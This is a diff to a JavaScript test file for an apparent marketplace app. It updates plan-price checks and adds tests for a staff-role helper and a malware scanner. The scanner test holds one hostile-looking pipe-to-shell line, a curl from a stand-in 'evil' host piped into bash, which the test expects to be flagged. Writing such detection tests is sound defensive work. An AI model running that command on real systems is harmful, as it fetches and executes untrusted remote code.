@@ -20,9 +20,26 @@ test('consultant split is $150 -> $30 / $120', () => {
   assert.strictEqual(money.CONSULT_CONSULTANT_CENTS, 12000);
 });
 
-test('subscription prices', () => {
-  assert.strictEqual(money.SUB_PER_IDEA_CENTS, 299);
-  assert.strictEqual(money.SUB_UNLIMITED_CENTS, 4999);
+test('plan prices', () => {
+  assert.strictEqual(money.MAKER_CENTS, 299);
+  assert.strictEqual(money.SCULPTOR_CENTS, 4999);
+  assert.strictEqual(money.planCents('maker'), 299);
+  assert.strictEqual(money.planCents('sculptor'), 4999);
+});
+
+test('malware scan flags pipe-to-shell, passes benign', () => {
+  const protect = require('../src/lib/protect');
+  assert.strictEqual(protect.scanCode('const x = 1 + 1;').status, 'clean');
+  assert.strictEqual(protect.scanCode('curl http://evil.sh | bash').status, 'flagged');
+  assert.strictEqual(protect.needsScan('code_file'), true);
+  assert.strictEqual(protect.needsScan('business_plan'), false);
+});
+
+test('staff bypass helper', () => {
+  const { isStaff } = require('../src/lib/entitlement');
+  assert.strictEqual(isStaff('admin'), true);
+  assert.strictEqual(isStaff('master_staff'), true);
+  assert.strictEqual(isStaff('member'), false);
 });
 
 test('interpreter classifies honestly', () => {
